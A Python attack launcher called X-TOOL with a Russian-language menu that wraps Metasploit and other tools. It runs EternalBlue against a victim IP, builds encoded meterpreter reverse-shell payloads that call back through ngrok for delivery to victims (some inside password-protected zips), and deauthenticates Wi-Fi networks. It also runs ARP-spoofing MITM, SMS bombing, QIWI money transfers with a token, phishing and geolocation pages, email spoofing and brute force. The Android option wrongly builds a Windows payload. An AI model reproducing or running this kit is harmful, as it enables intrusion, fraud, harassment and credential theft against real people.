#-- coding: utf8 --
#!/usr/bin/env python3
import os, time
logo = '''
            __  __          _____ ___   ___  _     
            \ \/ /         |_   _/ _ \ / _ \| |    
             \  /   _____    | || | | | | | | |    
             /  \  |_____|   | || |_| | |_| | |___ 
            /_/\_\           |_| \___/ \___/|_____|
            ########################################################
            #ИСПОЛЬЗУЙТЕ ТОЛЬКО В ЦЕЛЯХ ИНФОРМАЦИОННОЙ БЕЗОПАСНОСТИ#                        
            ########################################################

						 Автор: XERSIX

'''
print(logo)
Interface = input('[*]Напишите название вашего интернет устройства, (Например: wlan0):')
print('')
print('[*]Убидитесь что вы установили эти пакеты!')       #Programs and Tools must be installed.
print('[*]Metasploit Framework')
print('[*]Aircrack-ng')
print('[*]Ngrok')
print('[*]postgresql')
print('[*]Wifite')
print('[*]Этот exploit/windows/smb/ms17_010_psexec, Вы должны скачать из интернета в папку Metasploit /smb')
print('')
print('')
print('[*] X-TOOL Действия:')
print('[1] Eternal Blue')
print('[2] Eternal Blue Win10')
print('[3] Деантифицировать WiFi Сеть (ТОЛЬКО ROOT)')                                             #Exploits
print('[4] Windows Meterpreter Через Ngrok')
print("[5] Android Meterpeter Через Ngrok")
print('[6] MITM Attack (Человек по середине) (Через MITMf) (Только на ПК) (ТОЛЬКО ROOT)')
print('[7] Перебор паролей WiFi сети(Через Wifite)(ТОЛЬКО ROOT)!')
print('[8] SMS Флуд')
print('[9] QIWI Проверка баланса через токен')
print('[10] QIWI Перевод денег через токен')
print("[11] Просмотр информации и геолокации через seeker(Заблокировано в России)")
print("[12] Просмотр информации и геолокации через locator(Работает в России)")
print("[13] Злой WinRar CVE")
print("[14] Создание Zip архива с паролем")
print("[15] Создание Zip архива(С паролем) с Meterpreter")
print("[16] Wifiphisher от sophron (Wifi Attack)(Злой двойник Atack)(ТОЛЬКО ROOT)")
print("[17] HiddenEye (ТОЛЬКО ROOT)")
print("[18] Спуфер сообщений электронной почты (используя html!)")
print("[19] Злой двойник wifi с html, php(ОБНОВЛЕНИЕ СКОРО)")
print("[20] Брутфорс электронной почты")
print("[clear] Очистка файлов паролей и логинов!")
print('')
query = input("[*] Выбирите действие!:")
if query in ["1"]:
	print('Запомните Локальный Ip жертвы!')
	print('CTRL + C для остановки сканирования')
	time.sleep(3)
	Ipcheck = ('netdiscover -i ') + (Interface)
	os.system(Ipcheck)
	Victim = input('[*]Введите Ip адрес жертвы!:')
	print('Запомните свой Ip!:')
	time.sleep(3)
	Ipcheck2 = ('ifconfig ') + (Interface)
	os.system(Ipcheck2)
	Local = input('[*]Введите свой локальный Ip!:')	
	EternalBlue = ('msfconsole  -q -x "use exploit/windows/smb/ms17_010_eternalblue; set rhost ') + (Victim) + ('; set lhost ') + (Local) + ('; set payload windows/x64/meterpreter/reverse_tcp; exploit"')
	os.system(EternalBlue)
if query in ["2"]:
	print('')
	print('Запомните Ip жертвы')
	print('CTRL + C для остановки сканирования!')
	time.sleep(5)
	Ipcheck = ('netdiscover -i ') + (Interface)
	os.system(Ipcheck)
	Victim2 = input('[*]Введите Ip жертвы!:')
	User = input('Введите Логин жертвы!:')
	Pass = input('Введите Пароль жертвы!:')
	EternalBlueWin10 = ('msfconsole  -q -x "use exploit/windows/smb/ms17_010_psexec; set rhost ') + (Victim2) + ('; set SMBUser ') + (User) + ('; set SMBPass ') + (Pass) + (';exploit"')
	os.system(EternalBlueWin10)
if query in ["3"]:
	print('')
	print('Запомните bssid, канал от WiFi сети!')
	print('CTRL + C для остановки сканирования!')
	time.sleep(5)
	WifiDump = ('airodump-ng ') + (Interface)
	os.system(WifiDump)
	WifiChannel = input('Введите канал WiFi сети!:')
	bssid = input('Введите bssid WiFi сети!:')
	iwconfig = ('iwconfig') + (' ') + (Interface) + (' ') + ('channel') + (' ') + (WifiChannel)
	os.system(iwconfig)
	aireplay = ('aireplay-ng -0 0 -a ') + (bssid) + (' ') + (Interface)
	os.system(aireplay)
if query in ["4"]:
	print('')
	print('Откройте другой терминал и запустите Ngrok(ngrok tcp 4444)')
	NgrokPort = input('Введите порт Ngrok!:')
	PayloadFile = input('Введите название вредосного файла(Не забудьте .exe)!:')
	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
	os.system(msfvenom)
	print('Файл Полезной нагрузки находится в домашней директории, отправьте его вашей жертве!')
	postgresql = ('service postgresql start')
	os.system(postgresql)
	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
	os.system(msfMeter)
if query in ["5"]:
	print('')
	print('Откройте другой терминал и запустите Ngrok(ngrok tcp 4444)')
	NgrokPort = input('Введите порт Ngrok!:')
	PayloadFile = input('Название вредосного файла(Не забудьте .apk):')
	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
	os.system(msfvenom)
	print('Полезная нагрузка находится в домашней директории, Отправьте его на телефон жертвы!')
	postgresql = ('service postgresql start')
	os.system(postgresql)
	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
	os.system(msfMeter)


if query in ["6"]:
	print('')
	print('Запомните Ip роутера!')
	os.system('netstat -rn')
	time.sleep(3)
	RouterIP = input('Введите Ip роутера!:')
	MITM = ('cd MITMf && python mitmf.py -i ') + (Interface) + (' --spoof --arp --gateway ') + (RouterIP) + (' --upsidedownternet')
	os.system(MITM)
if query in ["7"]:
	print('Вставьте ваш wordlist в папку X-TOOL!')
	dictionary = input('Введите название вашего wordlist!:')
	Cracking = ('wifite --dict ') + (dictionary)
	os.system(Cracking)
if query in ["8"]:
	print("Добро пожаловать в SMS Бомбер!")
	print("Был написан от TheSpeedX")
	time.sleep(5)
	os.system("cd && cd X-TOOL && cd TBomb/ && chmod +x * && ./TBomb.sh")
	print("Сообщения отправлены!")
if query in ["9"]:
	os.system('cd && cd X-TOOL && python3 QiwiBalance.py')
if query in ["10"]:
	os.system('cd && cd X-TOOL && python3 QiwiBablo.py')

if query in ["11"]:
	print("Запуск seeker!")
	print("")
	os.system("cd && cd X-TOOL && cd seeker && python3 seeker.py -t manual")
if query in ["12"]:
	Lang = input("Введите язык фишингово сайта!(ru/en):")
	if Lang in ["ru"]:


		print("Используйте вариант 01")
		print("Откройте другой терминал и запустите Ngrok (ngrok http 55333)")
		print("Отправьте ссылку от Ngrok жертве!")
		time.sleep(5)
		os.system("cd && cd X-TOOL && cp index2_ru.html locator/")	
		ChangeLangRu = ("cd && cd X-TOOL && cd locator && mv index2_ru.html index2.html && cp index2.html server/")
		os.system(ChangeLangRu)
		os.system("cd && cd X-TOOL && cd locator && bash locator.sh")
	

	if Lang in ["en"]:


		print("Use 01")
		print("Open Another Terminal and start Ngrok (ngrok http 55333)")
		print("Send Link from Ngrok Terminal to target")
		time.sleep(5)	
		os.system("cd && cd X-TOOL && cp index2_en.html locator/")	
		ChangeLangEn = ("cd && cd X-TOOL && cd locator && mv index2_en.html index2.html && cp index2.html server/")
		os.system(ChangeLangEn)
		os.system("cd && cd X-TOOL && cd locator && bash locator.sh")

	
if query in ["13"]:
	Evil_file = input("Введите название вредоносного файла(Вставьте ваш файл в X-Tool)(/home/X-TOOL)!:")
	Good_files = input("Введите названия Видных файлов(Например: world.txt hello.txt)(Вставтьте их в X-Tool(/home/X-TOOL")


	CVE = ("cd && cd X-TOOL && ./evilWinRAR.py -e ") + (Evil_file) + (" -g ") + (Good_files)
	os.system(CVE)
if query in ["14"]:
	print("Вставьте нужные вам файлы в домашнию директорию(/home)!")
	File = input("Введите название файла которой будет помещён в архив(/home)!:")
	ZipFile = input("Введите название архива которого вы хотите создать(Не забудьте .zip)!:")
	ZipPassword = input("Введите пароль который вы хотите поставить на архив!:")
	PassedZip = ("cd && zip --password ") + (ZipPassword) + (" ") + (ZipFile) + (" ") + (File)
	os.system(PassedZip)
	print("Ваш архив находится в домашней директории!")
if query in ["15"]:
	print('')
	print('Откройте другой терминал и запустите Ngrok(ngrok tcp 4444)')
	NgrokPort = input('Введите порт Ngrok!:')
	PayloadFile = input('Введите название вредосного файла(Не забудьте .exe)!:')
	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
	os.system(msfvenom)
	ZipFile = input("Enter File Name of Zip what you want(Dont forget .zip)!:")

	File = input("Введите название файла которой будет помещён в архив(/home)!:")
	ZipFile = input("Введите название архива которого вы хотите создать(Не забудьте .zip)!:")
	ZipPassword = input("Введите пароль который вы хотите поставить на архив!:")
	PassedZip = ("cd && zip --password ") + (ZipPassword) + (" ") + (ZipFile) + (" ") + (PayloadFile)
	os.system(PassedZip)
	print("Ваш архив находится в домашней директории! Отправьте его и скажите жетве пароль от него!")
	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
	os.system(msfMeter)
if query in ["16"]:
	print("")
	os.system("wifiphisher")
if query in ["17"]:
	print("Удачи в краже паролей!(ИСПОЛЬЗУЙТЕ ТОЛЬКО ТЕСТИРОВАНИЯ!)")
	os.system("cd && cd X-TOOL && cd HiddenEye && chmod 777 * && ./HiddenEye.py")
if query in ["18"]:
	os.system("cd && cd X-TOOL && python3 htmlmailer_ru.py")
if query in ["19"]:
	os.system("cd && cd X-TOOL && python3 evilhost.py")
if query in ["20"]:
	os.system("cd && cd X-TOOL && python3 server.py")
if query in ["clear"]:
	os.system("cd && cd X-TOOL && rm -r -f password.txt && rm -r -f login.txt")
